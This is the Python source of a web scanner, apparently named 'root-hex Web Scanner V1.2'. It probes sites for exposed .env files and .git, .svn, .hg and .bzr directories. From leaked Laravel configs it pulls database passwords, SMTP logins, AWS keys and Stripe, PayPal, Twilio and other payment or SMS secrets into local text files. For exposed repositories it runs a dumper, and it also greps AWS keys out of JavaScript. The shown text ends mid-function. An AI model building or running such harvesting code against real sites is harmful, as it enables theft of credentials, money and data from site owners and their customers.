import sys
import os
import time
import json
import re
import threading
import subprocess
try:
    import shutil
    import datetime
    import requests
    from rich import print
    from rich.console import Console
    from rich.traceback import install
    from rich.table import Table
    from rich.progress import track
    from rich.prompt import Prompt
    from preferredsoundplayer import *
    from random import choice
    from colorama import Fore
    from bs4 import BeautifulSoup
    from multiprocessing import Pool
    from svn_dump import *
    from awses import AwsChecker
    #from hg_dump import fetch_hg
except Exception as err:
    exit(f'pip install -r requirements.txt\n[!] {err}')

install() #Traceback Install

console = Console()

def print(msg):
    console.print(f"{msg}")

def dialog(msg):
    output = Prompt.ask(msg)
    return output
    #name = Prompt.ask("Enter your name", choices=["Paul", "Jessica", "Duncan"], default="Paul")

def TableBuilder(suTitle, columns, suRows):
    table = Table(title=suTitle)
    table.add_column(columns)
    table.add_row(suRows)
    console.print(table)

######COLORS######
YELLOW = Fore.YELLOW
GREEN  = Fore.GREEN
RED = Fore.RED
LIGHTRED = Fore.LIGHTRED_EX
PURPLE = Fore.LIGHTMAGENTA_EX
RESET = Fore.RESET
CYAN = Fore.CYAN

######DATE######
now = datetime.datetime.now()
year = now.strftime('%Y')
month = now.strftime('%m')

######SETTINGS######
tout=5
gOneBot = True

######RERSULTS######
GitHits = 0
SvnHits = 0
HgHits = 0
EnvHits = 0
BzrHits = 0

######HEADERS######
HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-G973U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/14.2 Chrome/87.0.4280.141 Mobile Safari/537.36',
    'Content-type' : '*/*',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Connection': 'keep-alive',
}

######INSCOPE######
inScopeTargets = []

######CHECKING FOLDERS######
CheckF = ['Result', 'core', 'InScope', 'rez', 'Result/SvnRez', 'Result/Leaked', 'Result/Laravel', 'Result/AWS']

def CheckFolder(fld):
    if not os.path.isdir(fld):
        os.mkdir(fld)

for fld in CheckF:
    CheckFolder(fld)

######BANNER######
def banner(clear):
    # lists, dictionaries from library.json:
    try:
        with open('db.json') as included_imports:
            db = json.load(included_imports)
            users = (db['users'])
    except Exception as err:
        return console.print_exception(show_locals=True)
    
    if clear == 'yes':
        os.system('cls' if os.name == 'nt' else 'clear')

    console.print("[cyan]root-hex Web Scanner V1.2 [/cyan]")

    if users == "null":
        #print('\033[31m' +"/> Don't Change Tool Name!" + '\033[0m')
        try:
            root_name = dialog(f"Enter your username")
        except (KeyboardInterrupt, SystemExit):
            sys.exit(f"\n\n{YELLOW}see you later Guest. {RESET}")

        if root_name == 'owner':
            root_name = "root-hex"
        db['users'] = root_name
        # Write the modified object back to the JSON file
        with open('db.json', 'w') as f:
           json.dump(db, f)
            
    console.print("[cyan]" + db['users'] + "[/cyan]")

def settings_win():
    banner('yes')
    
    try:
        with open('db.json') as included_imports:
            sdb = json.load(included_imports)
            ENV = (sdb['ENV'])
            GIT = (sdb['GIT'])
            SVN = (sdb['SVN'])
            HG = (sdb['HG'])
            BZR = (sdb['BZR'])
            AWS_JS = (sdb['AWS_JS'])
    except Exception as err:
        return console.print_exception(show_locals=True)

    if ENV == 'on':
        console.print("1 [.env] ON", style="green")
    else:
        console.print("1 [.env] OFF", style="red")
    
    if GIT == 'on':
        console.print("2 [.git] ON", style="green")
    else:
        console.print("2 [.git] OFF", style="red")

    if SVN == 'on':
        console.print("3 [.svn] ON", style="green")
    else:
        console.print("3 [.svn] OFF", style="red")

    if HG == 'on':
        console.print("4 [.hg] ON", style="green")
    else:
        console.print("4 [.hg] OFF", style="red")

    if BZR == 'on':
        console.print("5 [.bzr] ON", style="green")
    else:
        console.print("5 [.bzr] OFF", style="red")

    if AWS_JS == 'on':
        console.print("6 [AWS_JS] ON", style="green")
    else:
         console.print("6 [AWS_JS] OFF", style="red")

    console.print("7 MAIN MENU", style="cyan")
    cmd = input(f"{CYAN}cmd {RED}> {RESET}")

    if cmd == '1':
        if ENV == 'on':
            sdb['ENV'] = 'off'
            with open('db.json', 'w') as f:
                json.dump(sdb, f)
        else:
            sdb['ENV'] = 'on'
            with open('db.json', 'w') as f:
                json.dump(sdb, f)

        return settings_win()

    elif cmd == '2':
        if GIT == 'on':
            sdb['GIT'] = 'off'
            with open('db.json', 'w') as f:
                json.dump(sdb, f)
        else:
            sdb['GIT'] = 'on'
            with open('db.json', 'w') as f:
                json.dump(sdb, f)

        return settings_win()

    elif cmd == '3':
        if SVN == 'on':
            sdb['SVN'] = 'off'
            with open('db.json', 'w') as f:
                json.dump(sdb, f)
        else:
            sdb['SVN'] = 'on'
            with open('db.json', 'w') as f:
                json.dump(sdb, f)

        return settings_win()

    elif cmd == '4':
        if HG == 'on':
            sdb['HG'] = 'off'
            with open('db.json', 'w') as f:
                json.dump(sdb, f)
        else:
            sdb['HG'] = 'on'
            with open('db.json', 'w') as f:
                json.dump(sdb, f)

        return settings_win()

    elif cmd == '5':
        if BZR == 'on':
            sdb['BZR'] = 'off'
            with open('db.json', 'w') as f:
                json.dump(sdb, f)
        else:
            sdb['BZR'] = 'on'
            with open('db.json', 'w') as f:
                json.dump(sdb, f)

        return settings_win()

    elif cmd == '6':
        if AWS_JS == 'on':
            sdb['AWS_JS'] = 'off'
            with open('db.json', 'w') as f:
                json.dump(sdb, f)
        else:
            sdb['AWS_JS'] = 'on'
            with open('db.json', 'w') as f:
                json.dump(sdb, f)

        return settings_win()
        

    elif cmd == '7':
        banner('yes')
        return hunt()

    else:
        banner('yes')
        return hunt()
    # else:
    #     banner('yes')
    #     hunt()

def auto(site):

    def env(target, endp):
        global EnvHits

        def get_db(data):

            try:   
                host = re.findall("\nDB_HOST=(.*?)\n", data)
                for xhost in host:
                    cfghost = xhost
                    break
                if "null" in str(cfghost):
                    return
                elif str(cfghost) == "mysql":
                    return
                elif str(cfghost) == "db":
                    return
                
                elif len(str(cfghost)) == 0 or len(str(cfghost)) == 1:
                    return
                elif "localhost" in str(cfghost) or "127.0.0.1" in str(cfghost):
                    return
                
                port = re.findall("\nDB_PORT=(.*?)\n",data)

                if port:
                    for xport in port:
                        cfgport = xport
                        break
                else:
                    return

                if "null" in str(cfgport):
                    return
                if len(str(cfgport)) == 0 or len(str(cfgport)) == 1:
                    return
                
                database = re.findall("\nDB_DATABASE=(.*?)\n", data)

                for xdb in database:
                    cfgdb = xdb
                    break
                
                if "null" in str(cfgdb):
                    return 
                if len(str(cfgdb)) == 0 or len(str(cfgdb)) == 1:
                    return
    
                dbusername = re.findall("\nDB_USERNAME=(.*?)\n", data)
                for xuser in dbusername:
                    cfguser = xuser
                    break
                
                if "null" in str(cfguser):
                    return
                if len(str(cfguser)) == 0 or len(str(cfguser)) == 1:
                    return
                
                dbpwd = re.findall("\nDB_PASSWORD=(.*?)\n", data)
                for xdbpwd in dbpwd:
                    cfgpwd = xdbpwd
                    break
                
                
                if "null" in str(cfgpwd):
                    return
                if len(str(cfgpwd)) == 0 or len(str(cfgpwd)) == 1:
                    return

                dbinfo = str(f"DB_HOST={cfghost}\nDB_PORT={cfgport}\nDB_DATABASE={cfgdb}\nDB_USERNAME={cfguser}\nDB_PASSWORD={cfgpwd}\n<---------->\n")[1:-1]
                

                dele = ["\r",'"',"'","(",")"]
                for w in dele:
                    dbinfo = dbinfo.replace(w,"")
        
                else:
                    try:
                        with open("Result/Laravel/DBs.txt", "a+", encoding="utf-8") as f:
                            f.write(f'{dbinfo}\n')
                    except Exception as err:
                        print(f'[!] ERROR [get_dbs] > {err}')
   
            except Exception as err:
                print(f'[!] ERROR [get_dbs] > {err}')
            
        def get_smtp(data):

            try:   
                host = re.findall("\nMAIL_HOST=(.*?)\n", data)

                for xhost in host:
                    cfghost = xhost
                    break
                if "null" in str(cfghost):
                    return
                elif len(str(cfghost)) == 0:
                    return
                
                port = re.findall("\nMAIL_PORT=(.*?)\n",data)
                for xport in port:
                    cfgport = xport
                    break
                if "null" in str(cfgport):
                    return
                elif len(str(cfgport)) == 0:
                    return
                
                user = re.findall("\nMAIL_USERNAME=(.*?)\n", data)
                for xuser in user:
                    cfguser = xuser
                    break
                if "null" in str(cfguser):
                    return
                elif len(str(cfguser)) == 0:
                    return
                
                pswd = re.findall("\nMAIL_PASSWORD=(.*?)\n", data)
                for xpwd in pswd:
                    cfgpwd = xpwd
                    break
                if "null" in str(cfgpwd):
                    return
                elif len(str(cfgpwd)) == 0:
                    return

                smtp = f"{cfghost}|{cfgport}|{cfguser}|{cfgpwd}"
                dele = ["\r",'"',"'","(",")"]
                for w in dele:
                    smtp = smtp.replace(w,"")

                smtp = smtp.replace(", ", '|')
                try:
                    with open("Result/Laravel/smtp.txt", "a+", encoding="utf-8") as f:
                        f.write(f'{smtp}\n')
                except Exception as err:
                    print(f'[!] ERROR [get_smtps] > {err}')
                    
            except:
                pass

        def get_aws(source):
            blacklistedkeywords = ['bucket','user','backend','url','path','poster','event','faq','profile','complaint','card','task','driver','db','queue','kourses','token']
            source = str(source).split('\n')
            out = ''
            for s in source:
                x = str(s).split('=')[0]
                if 'aws_' in str(x).lower() or 's3_' in str(x).lower() or 'ses_' in str(x).lower() or 'laravel_' in str(x).lower():
                    tt = 0
                    for aze in blacklistedkeywords:
                        if str(aze).lower() in str(x).lower():
                            tt +=1
                    if tt == 0:
                        if 'http' not in str(s).split('=')[1]:
                            if 'xxx' not in str(s).split('=')[1] and '***' not in str(s).split('=')[1]:
                                if str(s) not in str(out) and str(s).split('=')[1] not in str(out) and str(x).replace(' ','') not in str(s).split('=')[1]:
                                    out += s + '\n'
            if 'key' in str(out).lower() and 'secret' in str(out).lower():
               
                try:
                    lid = 0
                    regionx = re.findall("REGION=(.*?)\n", out)
                    akeysx = re.findall("ACCESS_KEY=(.*?)\n", out)
                    keysidsx = re.findall("KEY_ID=(.*?)\n", out)
                    for x in akeysx:
                        vregion = regionx[lid].replace('\n', '')
                        vaccesskey = akeysx[lid].replace('\n', '')
                        vkeysid = keysidsx[lid].replace('\n', '')
                        try:
                            with open('Result/Laravel/aws.txt', 'a', encoding="utf-8") as f:
                                f.write(f'{vkeysid}:{vaccesskey}:{vregion}\n')

                        except Exception as err:
                            print(f'[!] ERROR [get_aws] > {err}')

                        lid += 1
                except:
                    pass

        def get_stripe(source):
            blacklistedkeywords = ['product','price']
            source = str(source).split('\n')
            out = ''
            for s in source:
                x = str(s).split('=')[0]
                if 'stripe' in str(x).lower():
                    tt = 0
                    for aze in blacklistedkeywords:
                        if str(aze).lower() in str(x).lower():
                            tt +=1
                    if tt == 0:
                        if 'xxx' not in str(s).split('=')[1] and '***' not in str(s).split('=')[1]:
                            if str(s) not in str(out) and str(s).split('=')[1] not in str(out) and str(x).replace(' ','') not in str(s).split('=')[1]:
                                out += s + '|'
            if 'stripe' in str(out).lower() and ('key' in str(out).lower() or 'client' in str(out).lower() or 'secret' in str(out).lower() or 'public' in str(out).lower()):
                try:
                    with open('Result/Laravel/stripe.txt', 'a', encoding="utf-8") as f:
                        f.write(f'{out}\n')
                except Exception as err:
                    print(f'[!] ERROR [get_stripe] > {err}')
            
        def get_razorpay(source):
            source = str(source).split('\n')
            out = ''
            for s in source:
                x = str(s).split('=')[0]
                if 'razorpay' in str(x).lower():
                    if 'xxx' not in str(s).split('=')[1] and '***' not in str(s).split('=')[1]:
                        if str(s) not in str(out) and str(s).split('=')[1] not in str(out) and str(x).replace(' ','') not in str(s).split('=')[1]:
                            out += s + '|'
            if 'razorpay' in str(out).lower() and 'key' in str(out).lower():
                try:
                    with open('Result/Laravel/razorpay.txt', 'a', encoding="utf-8") as f:
                        f.write(f'{out}\n')
                except Exception as err:
                    print(f'[!] ERROR [get_razorpay] > {err}')
            
        def get_twilio(source):

            blacklistedkeywords = ['twiml','profile','key','verify','chat','call','plivo','test','service','notification','path']
            source = str(source).split('\n')
            out = ''
            for s in source:
                x = str(s).split('=')[0]
                if 'twilio' in str(x).lower() or 'twillo' in str(x).lower() or 'twillio' in str(x).lower() or 'auth_token' in str(x).lower() or 'account_sid' in str(x).lower():
                    tt = 0
                    for aze in blacklistedkeywords:
                        if str(aze).lower() in str(x).lower():
                            tt +=1
                    if tt == 0:
                        if 'xxx' not in str(s).split('=')[1] and '***' not in str(s).split('=')[1]:
                            if str(s) not in str(out) and str(s).split('=')[1] not in str(out) and str(x).replace(' ','') not in str(s).split('=')[1]:
                                out += s + '\n'
            if ('twilio' in str(out).lower() or 'twillo' in str(out).lower() or 'twillio' in str(out).lower()) and ('sid' in str(out).lower() or 'id' in str(out).lower()) and 'token' in str(out).lower():
                try:
                    with open('Result/Laravel/twilio.txt', 'a', encoding="utf-8") as f:
                        f.write(f'<----------->\n{out}\n')
                except Exception as err:
                    print(f'[!] ERROR [get_twilio] > {err}')

        def get_nexmo(source):
            source = str(source).split('\n')
            out = ''
            for s in source:
                x = str(s).split('=')[0]
                if 'nexmo' in str(x).lower():
                    if 'xxx' not in str(s).split('=')[1] and '***' not in str(s).split('=')[1]:
                        if str(s) not in str(out) and str(s).split('=')[1] not in str(out) and str(x).replace(' ','') not in str(s).split('=')[1]:
                            out += s + '\n'
            if 'nexmo' in str(out).lower() and 'key' in str(out).lower() and 'secret' in str(out).lower():
                try:
                    with open('Result/Laravel/nexmo.txt', 'a', encoding="utf-8") as f:
                        f.write(f'{out}\n')
                except Exception as err:
                    print(f'[!] ERROR [get_nexmo] > {err}')
                
        def get_paypal_sandbox(source):
            blacklistedkeywords = ['certificate']
            source = str(source).split('\n')
            out = ''
            for s in source:
                x = str(s).split('=')[0]
                if 'paypal_sandbox' in str(x).lower():
                    tt = 0
                    for aze in blacklistedkeywords:
                        if str(aze).lower() in str(x).lower():
                            tt +=1
                    if tt == 0:
                        if 'xxx' not in str(s).split('=')[1] and '***' not in str(s).split('=')[1]:
                            if str(s) not in str(out) and str(s).split('=')[1] not in str(out) and str(x).replace(' ','') not in str(s).split('=')[1]:
                                out += s + '\n'
            if 'paypal_sandbox' in str(out).lower() and ('username' in str(out).lower() or 'password' in str(out).lower() or 'secret' in str(out).lower() or 'id' in str(out).lower()):
                try:
                    with open('Result/Laravel/paypal_sandbox.txt', 'a', encoding="utf-8") as f:
                        f.write(f'{out}\n')
                except Exception as err:
                    print(f'[!] ERROR [get_paypal_sandbox] > {err}')
        
        def get_paypal_live(source):
            blacklistedkeywords = ['certificate']
            source = str(source).split('\n')
            out = ''
            for s in source:
                x = str(s).split('=')[0]
                if 'paypal_live' in str(x).lower():
                    tt = 0
                    for aze in blacklistedkeywords:
                        if str(aze).lower() in str(x).lower():
                            tt +=1
                    if tt == 0:
                        if 'xxx' not in str(s).split('=')[1] and '***' not in str(s).split('=')[1]:
                            if str(s) not in str(out) and str(s).split('=')[1] not in str(out) and str(x).replace(' ','') not in str(s).split('=')[1]:
                                out += s + '\n'
            if 'paypal_live' in str(out).lower() and( 'username' in str(out).lower() or 'password' in str(out).lower() or 'secret' in str(out).lower() or 'id' in str(out).lower()):
                try:
                    with open('Result/Laravel/paypal_live.txt', 'a', encoding="utf-8") as f:
                        f.write(f'{out}\n')
                except Exception as err:
                    print(f'[!] ERROR [get_paypal_live] > {err}')

        def get_onesignal(source):
            source = str(source).split('\n')
            out = ''
            for s in source:
                x = str(s).split('=')[0]
                if 'onesignal' in str(x).lower():
                    if 'xxx' not in str(s).split('=')[1] and '***' not in str(s).split('=')[1]:
                        if str(s) not in str(out) and str(s).split('=')[1] not in str(out) and str(x).replace(' ','') not in str(s).split('=')[1]:
                            out += s + '\n'
            if 'onesignal' in str(out).lower() and 'key' in str(out).lower():
                try:
                    with open('Result/Laravel/onesignal.txt', 'a', encoding="utf-8") as f:
                        f.write(f'{out}\n')
                except Exception as err:
                    print(f'[!] ERROR [get_onesignal] > {err}')

        def get_telnyx(source):
            source = str(source).split('\n')
            out = ''
            for s in source:
                x = str(s).split('=')[0]
                if 'telnyx_' in str(x).lower():
                    if 'xxx' not in str(s).split('=')[1] and '***' not in str(s).split('=')[1]:
                        if str(s) not in str(out) and str(s).split('=')[1] not in str(out) and str(x).replace(' ','') not in str(s).split('=')[1]:
                            out += s + '\n'
            if 'telnyx' in str(out).lower() and ('number' in str(out).lower() or 'from' in str(out).lower()) and 'secret' in str(out).lower():
                try:
                    with open('Result/Laravel/telnyx.txt', 'a', encoding="utf-8") as f:
                        f.write(f'{out}\n')
                except Exception as err:
                    print(f'[!] ERROR [get_telnyx] > {err}')

        def get_textlocal(source):
            source = str(source).split('\n')
            out = ''
            for s in source:
                x = str(s).split('=')[0]
                if 'textlocal_' in str(x).lower():
                    if 'xxx' not in str(s).split('=')[1] and '***' not in str(s).split('=')[1]:
                        if str(s) not in str(out) and str(s).split('=')[1] not in str(out) and str(x).replace(' ','') not in str(s).split('=')[1]:
                            out += s + '\n'
            if 'textlocal' in str(out).lower() and 'key' in str(out).lower():
                try:
                    with open('Result/Laravel/textlocal.txt', 'a', encoding="utf-8") as f:
                        f.write(f'{out}\n')
                except Exception as err:
                    print(f'[!] ERROR [get_textlocal] > {err}')

        def get_value_leaf(source):
            source = str(source).split('\n')
            out = ''
            for s in source:
                x = str(s).split('=')[0]
                if 'value_leaf_' in str(x).lower():
                    if 'xxx' not in str(s).split('=')[1] and '***' not in str(s).split('=')[1]:
                        if str(s) not in str(out) and str(s).split('=')[1] not in str(out) and str(x).replace(' ','') not in str(s).split('=')[1]:
                            out += s + '\n'
            if 'value_leaf' in str(out).lower() and 'key' in str(out).lower() and 'username' in str(out).lower() and 'password' in str(out).lower():
                try:
                    with open('Result/Laravel/value_leaf.txt', 'a', encoding="utf-8") as f:
                        f.write(f'{out}\n')
                except Exception as err:
                    print(f'[!] ERROR [get_value_leaf] > {err}')

        def get_sms(source):
            blacklistedkeywords = ['disabled','image/png','data:']
            source = str(source).split('\n')
            out = ''
            for s in source:
                x = str(s).split('=')[0]
                if 'sms' in str(x).lower():
                    tt = 0
                    for aze in blacklistedkeywords:
                        if str(aze).lower() in str(x).lower():
                            tt +=1
                    if tt == 0:
                        if 'xxx' not in str(s).split('=')[1] and '***' not in str(s).split('=')[1]:
                            if str(s) not in str(out) and str(s).split('=')[1] not in str(out) and str(x).replace(' ','') not in str(s).split('=')[1]:
                                out += s + '\n'
            if 'sms' in str(out).lower():
                try:
                    with open('Result/Laravel/sms.txt', 'a', encoding="utf-8") as f:
                        f.write(f'{out}\n')
                except Exception as err:
                    print(f'[!] ERROR [get_sms] > {err}')

        def get_openpay(source):
            source = str(source).split('\n')
            out = ''
            for s in source:
                x = str(s).split('=')[0]
                if 'openpay_' in str(x).lower():
                    if 'xxx' not in str(s).split('=')[1] and '***' not in str(s).split('=')[1]:
                        if str(s) not in str(out) and str(s).split('=')[1] not in str(out) and str(x).replace(' ','') not in str(s).split('=')[1]:
                            out += s + '\n'
            if 'openpay' in str(out).lower() and ('key' in str(out).lower() or 'client' in str(out).lower() or 'secret' in str(out).lower() or 'public' in str(out).lower()):
                try:
                    with open('Result/Laravel/openpay.txt', 'a', encoding="utf-8") as f:
                        f.write(f'{out}\n')
                except Exception as err:
                    print(f'[!] ERROR [get_onepay] > {err}')

        def get_clicksend(source):
            source = str(source).split('\n')
            out = ''
            for s in source:
                x = str(s).split('=')[0]
                if 'clicksend_' in str(x).lower():
                    if 'xxx' not in str(s).split('=')[1] and '***' not in str(s).split('=')[1]:
                        if str(s) not in str(out) and str(s).split('=')[1] not in str(out) and str(x).replace(' ','') not in str(s).split('=')[1]:
                            out += s + '\n'
            if 'clicksend' in str(out).lower() and 'username' in str(out).lower() and 'key' in str(out).lower():
                try:
                    with open('Result/Laravel/clicksend.txt', 'a', encoding="utf-8") as f:
                        f.write(f'{out}\n')
                except Exception as err:
                    print(f'[!] ERROR [get_clicksend] > {err}')

        def get_xgate(source):
            source = str(source).split('\n')
            out = ''
            for s in source:
                x = str(s).split('=')[0]
                if 'xgate_' in str(x).lower():
                    if 'xxx' not in str(s).split('=')[1] and '***' not in str(s).split('=')[1]:
                        if str(s) not in str(out) and str(s).split('=')[1] not in str(out) and str(x).replace(' ','') not in str(s).split('=')[1]:
                            out += s + '\n'
            if 'xgate' in str(out).lower():
                try:
                    with open('Result/Laravel/xgate.txt', 'a', encoding="utf-8") as f:
                        f.write(f'{out}\n')
                except Exception as err:
                    print(f'[!] ERROR [get_xgate] > {err}')

        def get_aimon(source):
            source = str(source).split('\n')
            out = ''
            for s in source:
                x = str(s).split('=')[0]
                if 'aimon_' in str(x).lower():
                    if 'xxx' not in str(s).split('=')[1] and '***' not in str(s).split('=')[1]:
                        if str(s) not in str(out) and str(s).split('=')[1] not in str(out) and str(x).replace(' ','') not in str(s).split('=')[1]:
                            out += s + '\n'
            if 'aimon' in str(out).lower():
                try:
                    with open('Result/Laravel/aimon.txt', 'a', encoding="utf-8") as f:
                        f.write(f'{out}\n')
                except Exception as err:
                    print(f'[!] ERROR [get_aimon] > {err}')

        def get_plivo(source):
            source = str(source).split('\n')
            out = ''
            for s in source:
                x = str(s).split('=')[0]
                if 'plivo_' in str(x).lower():
                    if 'xxx' not in str(s).split('=')[1] and '***' not in str(s).split('=')[1]:
                        if str(s) not in str(out) and str(s).split('=')[1] not in str(out) and str(x).replace(' ','') not in str(s).split('=')[1]:
                            out += s + '\n'
            if 'plivo' in str(out).lower():
                try:
                    with open('Result/Laravel/plivo.txt', 'a', encoding="utf-8") as f:
                        f.write(f'{out}\n')
                except Exception as err:
                    print(f'[!] ERROR [get_plivo] > {err}')

        def get_aruba(source):
            source = str(source).split('\n')
            out = ''
            for s in source:
                x = str(s).split('=')[0]
                if 'aruba_' in str(x).lower():
                    if 'xxx' not in str(s).split('=')[1] and '***' not in str(s).split('=')[1]:
                        if str(s) not in str(out) and str(s).split('=')[1] not in str(out) and str(x).replace(' ','') not in str(s).split('=')[1]:
                            out += s + '\n'
            if 'aruba' in str(out).lower():
                try:
                    with open('Result/Laravel/aruba.txt', 'a', encoding="utf-8") as f:
                        f.write(f'{out}\n')
                except Exception as err:
                    print(f'[!] ERROR [get_aruba] > {err}')

        def get_skebby(source):
            source = str(source).split('\n')
            out = ''
            for s in source:
                x = str(s).split('=')[0]
                if 'skebby_' in str(x).lower() or 'skbby_' in str(x).lower():
                    if 'xxx' not in str(s).split('=')[1] and '***' not in str(s).split('=')[1]:
                        if str(s) not in str(out) and str(s).split('=')[1] not in str(out) and str(x).replace(' ','') not in str(s).split('=')[1]:
                            out += s + '\n'
            if ('skebby' in str(out).lower() or 'skbby' in str(out).lower()):
                try:
                    with open('Result/Laravel/skebby.txt', 'a', encoding="utf-8") as f:
                        f.write(f'{out}\n')
                except Exception as err:
                    print(f'[!] ERROR [get_skebby] > {err}')

        def get_clickatell(source):
            source = str(source).split('\n')
            out = ''
            for s in source:
                x = str(s).split('=')[0]
                if 'clickatell_' in str(x).lower():
                    if 'xxx' not in str(s).split('=')[1] and '***' not in str(s).split('=')[1]:
                        if str(s) not in str(out) and str(s).split('=')[1] not in str(out) and str(x).replace(' ','') not in str(s).split('=')[1]:
                            out += s + '\n'
            if ('clickatell' in str(out).lower() or 'key' in str(out).lower()):
                try:
                    with open('Result/Laravel/clickatell.txt', 'a', encoding="utf-8") as f:
                        f.write(f'{out}\n')
                except Exception as err:
                    print(f'[!] ERROR [get_clickatell] > {err}')

        try:
            url = target + endp
            try:
                GetConfig = requests.get(url, headers=HEADERS, timeout=7)
            except:
                return False

            if "Checking Browser" in GetConfig.text:
                return False   
            elif GetConfig.status_code == 404:
                return False 
            elif GetConfig.status_code == 403:
                return False 
            else:
                if "APP_NAME=" in GetConfig.text:
                    if "APP_ENV=" in GetConfig.text:
                        
                        with open('Result/Laravel/Config.txt', 'a', encoding="utf-8") as f:
                            f.write(f"{url}\n")

                        get_db(GetConfig.text)
                        get_smtp(GetConfig.text)
                        get_aws(GetConfig.text)
                        get_stripe(GetConfig.text)
                        get_razorpay(GetConfig.text)
                        get_skebby(GetConfig.text)
                        get_clickatell(GetConfig.text)
                        get_twilio(GetConfig.text)
                        get_plivo(GetConfig.text)
                        get_aruba(GetConfig.text)
                        get_nexmo(GetConfig.text)
                        get_paypal_sandbox(GetConfig.text)
                        get_paypal_live(GetConfig.text)
                        get_onesignal(GetConfig.text)
                        get_telnyx(GetConfig.text)
                        get_textlocal(GetConfig.text)
                        get_value_leaf(GetConfig.text)
                        get_sms(GetConfig.text)
                        get_openpay(GetConfig.text)
                        get_clicksend(GetConfig.text)
                        get_xgate(GetConfig.text)
                        get_aimon(GetConfig.text)
            
                        try:
                            playsound()
                        except:
                            pass
        
                        EnvHits += 1
                        return True 
                    
                    else:
                        return False
                else:        
                    return False

        except Exception as err:
            return False
        
    def checkBZR(target, endp):
        global BzrHits
        global gOneBot

        url = f"{target}{endp}"
        try:
            response = requests.get(url, headers=HEADERS, timeout=5)
        except:
            return print(f"[yellow][BZR] {target} > TIMEOUT[/yellow]")

        if "Checking Browser" in response.text:
            print(f"[red][BZR] {url} > BAD[/red]")
        elif response.status_code == 404:
            print(f"[red][BZR] {url} > BAD[/red]")
        elif response.status_code == 403:
            print(f"[red][BZR] {url} > BAD[/red]")

        else:
            if "Index of /.bzr" in response.text:
         
                try:
                    with open('Result/BZR.txt', 'a', encoding="utf-8") as f:
                        f.write(f"{url}\n")
                except Exception as err:
                    console.print_exception(show_locals=True)

                BzrHits += 1
                playsound()
                print(f"[green][BZR] {url} > VULN[/green]")

            else:
                print(f"[red][BZR] {url} > BAD[/red]")

    def checkSVN(target, endp):
        global SvnHits
        global gOneBot

        url = f"{target}{endp}"
        try:
            response = requests.get(url, headers=HEADERS, timeout=5)
        except:
            return print(f"[yellow][SVN] {target} > TIMEOUT[/yellow]")

        if "Checking Browser" in response.text:
            print(f"[red][SVN] {url} > BAD[/red]")
        elif response.status_code == 404:
            print(f"[red][SVN] {url} > BAD[/red]")
        elif response.status_code == 403:
            print(f"[red][SVN] {url} > BAD[/red]")

        else:
            if "Index of /.svn" in response.text:
         
                try:
                    with open('Result/SVN.txt', 'a', encoding="utf-8") as f:
                        f.write(f"{url}\n")
                except Exception:
                    console.print_exception(show_locals=True)

                SvnHits += 1
                playsound()
                print(f"[green][SVN] {url} > VULN[/green]")

                try:
                    fetch_svn(url.replace('/.svn', ''))
                except Exception as err:
                    print(f"[yellow][Exception][fetch_svn][/yellow] => {err}")

                try:
                    anycmd(f"Result/SvnRez/{target.replace('http://', '')}")
                except Exception as err:
                    print(f"[yellow][Exception][svncmd][/yellow] => {err}")

            else:
                print(f"[red][SVN] {url} > BAD[/red]")
                
    def checkHG(target, endp):
        global HgHits

        url = f"{target}{endp}"
        try:
            response = requests.get(url, headers=HEADERS, timeout=5)
        except:
            return console.print(f"[yellow][HG] {url} > TIMEOUT[/yellow]")

        if "Checking Browser" in response.text:
            return console.print(f"[red][HG] {url} > BAD[/red]")
        elif response.status_code == 404:
            return console.print(f"[red][HG] {url} > BAD[/red]")
        elif response.status_code == 403:
            return console.print(f"[red][HG] {url} > BAD[/red]")

        if "Index of /.hg" in response.text:
     
            with open("Result/HG.txt", "a", encoding="utf-8") as f:
                f.write(f"{url}\n")

            HgHits += 1
            playsound()
            console.print(f"[green][HG] {url} > VULN[/green]")

            try:
                fetch_hg(target)
            except Exception as err:
                console.print(f"[magenta]Exception [fetch_hg] > {err}[/magenta]")

            try:
                hgcmd(f"rez/{target.replace('http://', '')}")
            except Exception as err:
                console.print(f"[magenta]Exception [hgcmd] > {err}[/magenta]")
                

            # patch_path = "/.hg/hgrc"
            # try:
            #     patch_response = requests.get(target + patch_path, verify=True, timeout=7)
            #     patch_response.raise_for_status()
            # except:
            #     return False

            # if "speedtest" in patch_response.text:
            #     return False
            # else :
            #     with open("Result/.hg.txt", "a", encoding="utf-8") as f:
            #         f.write(f"{target}/.hg\n")

            #     return True
        else:
            return console.print(f"[red][HG] {url} > BAD[/red]")

    def checkGit(target, endp):
        global GitHits

        url = target + endp
        try:
            response = requests.get(url, headers=HEADERS, timeout=5)
        except:
            return console.print(f"[yellow][GIT] {url} > TIMEOUT[/yellow]")

        if "Checking Browser" in response.text:
            console.print(f"[red][GIT] {url} > BAD[/red]")  
        elif response.status_code == 404:
            console.print(f"[red][GIT] {url} > BAD[/red]")
        elif response.status_code == 403:
            console.print(f"[red][GIT] {url} > BAD[/red]")
        else:
            if "repositoryformatversion" in response.text:

                try:
                    with open('Result/GIT.txt', 'a', encoding="utf-8") as f:
                        f.write(f"{url}\n")
                except Exception as err:
                    console.print_exception(show_locals=True)
                    
                GitHits += 1
                console.print(f"\n[green][GIT] {url} > VULN[/green]")

                try:
                    playsound()
                except:
                    pass

                # try:
                #     fetch_git(target)
                # except Exception as err:
                #     print(f"{PURPLE} Exception [checkGit] > {err}")

                try:

                    tarx = target.replace('http://', '').replace('https://', '').replace('/.git/config', '')
                    cmd = ['python3', 'git_dumper.py', url.replace('/.git/config', ''), f'rez/{tarx}']
                    subprocess.run(cmd, check=True)
                    # gitcmd(f'rez/{tarx}')
                    # finder()
                except Exception as err:
                    console.print(f"[magenta]Exception [gitcmd] > {err}[/magenta]")
                
            else:
                console.print(f"\n[red][GIT] {url} > BAD[/red]")

    def awsjs_checker(target):
        try:
            req = requests.get(target, params = {"model": "Mustang"}, timeout=30)
            response = str(req.content)
            KEY = re.findall(r'AKIA[0-9A-Z]{16}', response)[0]
            try:
                SECRET = re.findall(r'"[a-zA-Z0-9]{40}"', response)[0]
            except:
                try:
                    SECRET = re.findall(r"'[a-zA-Z0-9]{40}'", response)[0]
                except:
                    SECRET = "N/A"
            
            SECRET = SECRET.replace('"', '')
                    
            if KEY:
                console.print(f"[green]FOUND AKIA REGEX > {target} / {KEY}|{SECRET} > Result/AWS/AWS_JS.txt[/green]")
                
